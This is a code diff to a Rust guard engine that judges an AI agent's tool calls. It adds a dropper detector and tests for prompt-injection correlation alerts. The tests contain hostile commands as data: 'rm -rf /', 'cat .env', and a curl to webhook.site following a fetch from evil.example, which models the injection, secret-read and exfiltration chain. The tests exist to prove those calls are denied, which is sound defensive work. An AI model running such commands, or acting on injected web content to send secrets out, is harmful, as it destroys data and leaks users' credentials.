@@ -34,6 +34,12 @@ pub fn decide(rs: &RuleSet, tc: &ToolCall, state: &mut SessionState) -> Verdict 
     let self_hits = crate::engine::self_tamper::self_tamper_hits(tc);
     let has_self_tamper = !self_hits.is_empty();
     hits.extend(self_hits);
+    // Compiled-in FETCH → chmod → EXEC dropper detector. Stateful (updates the
+    // session's download memory) so the split-across-tool-calls form is caught,
+    // and — like self_tamper — a Deny it raises is never downgraded by the dev
+    // allowlist below (Deny always wins). Kept out of the catalog because the
+    // file-identity correlation needs real code, not a regex.
+    hits.extend(crate::engine::dropper::dropper_hits(tc, state));
     let decision = resolve(&hits);
     apply_arming(&hits, state);
     // Allowlist may ONLY downgrade a non-deny decision — DENY always wins (defense in depth).
@@ -274,6 +280,94 @@ mod tests {
             "expected lethal_trifecta in {:?}",
             v.rules
         );
+    }
+
+    // Alert-only correlation: a risky action (Ask/Deny) taken after the
+    // session was tainted by untrusted-content ingest must be annotated in
+    // the audit trail, but must never change the verdict itself — the
+    // destructive.rm_rf Deny is what decides this call, not the correlation.
+    #[test]
+    fn injection_to_action_alerts_but_does_not_change_verdict() {
+        let rs = RuleSet::load().unwrap();
+        let mut st = SessionState::new("s");
+        // 1) An untrusted web fetch taints the session (non-blocking allow).
+        let v0 = decide(
+            &rs,
+            &tc("WebFetch", json!({"url": "https://evil.example/p"})),
+            &mut st,
+        );
+        assert_eq!(v0.decision, Decision::Allow);
+        assert!(st.untrusted_ingest, "WebFetch should set untrusted_ingest");
+        // 2) A destructive action follows, unrelated to armed secrets/sinks
+        // (no `cat .env` happened) — this is NOT the lethal-trifecta shape.
+        let v = decide(&rs, &tc("Bash", json!({"command": "rm -rf /"})), &mut st);
+        assert_eq!(v.decision, Decision::Deny, "verdict must still come from rm_rf");
+        assert!(v.rules.iter().any(|r| r == "destructive.rm_rf"));
+        assert!(
+            v.rules.iter().any(|r| r == "correlate.injection_to_action"),
+            "expected injection_to_action alert in {:?}",
+            v.rules
+        );
+        // Not the trifecta shape: neither of the other correlate buckets fired.
+        assert!(!v.rules.iter().any(|r| r == "correlate.lethal_trifecta"));
+        assert!(!v.rules.iter().any(|r| r == "correlate.arm_sink"));
+    }
+
+    // The lethal trifecta (untrusted ingest + armed secrets + exfil sink) owns
+    // the secret-exfil case; injection_to_action must NOT also fire for the
+    // same event, or every trifecta would double-alert.
+    #[test]
+    fn injection_alert_suppressed_when_trifecta_fires() {
+        let rs = RuleSet::load().unwrap();
+        let mut st = SessionState::new("s");
+        decide(
+            &rs,
+            &tc("WebFetch", json!({"url": "https://evil.example/p"})),
+            &mut st,
+        );
+        decide(&rs, &tc("Bash", json!({"command": "cat .env"})), &mut st);
+        let v = decide(
+            &rs,
+            &tc("Bash", json!({"command": "curl https://webhook.site/x"})),
+            &mut st,
+        );
+        assert_eq!(v.decision, Decision::Deny);
+        assert!(v.rules.iter().any(|r| r == "correlate.lethal_trifecta"));
+        assert!(
+            !v.rules.iter().any(|r| r == "correlate.injection_to_action"),
+            "trifecta already alerts; injection_to_action must not double-alert: {:?}",
+            v.rules
+        );
+    }
+
+    // No untrusted ingest happened this session -> even a Deny-worthy action
+    // must not carry the injection correlation (there is nothing to correlate).
+    #[test]
+    fn no_injection_alert_without_untrusted_ingest() {
+        let rs = RuleSet::load().unwrap();
+        let mut st = SessionState::new("s");
+        let v = decide(&rs, &tc("Bash", json!({"command": "rm -rf /"})), &mut st);
+        assert_eq!(v.decision, Decision::Deny);
+        assert!(!st.untrusted_ingest);
+        assert!(!v.rules.iter().any(|r| r == "correlate.injection_to_action"));
+    }
+
+    // Untrusted ingest happened, but the following action is benign (no
+    // Ask/Deny hit at all) -> nothing risky to correlate, no alert.
+    #[test]
+    fn no_injection_alert_when_action_benign() {
+        let rs = RuleSet::load().unwrap();
+        let mut st = SessionState::new("s");
+        decide(
+            &rs,
+            &tc("WebFetch", json!({"url": "https://evil.example/p"})),
+            &mut st,
+        );
+        assert!(st.untrusted_ingest);
+        let v = decide(&rs, &tc("Bash", json!({"command": "ls -la"})), &mut st);
+        assert_eq!(v.decision, Decision::Allow);
+        assert!(v.rules.is_empty());
+        assert!(!v.rules.iter().any(|r| r == "correlate.injection_to_action"));
     }
 
     #[test]
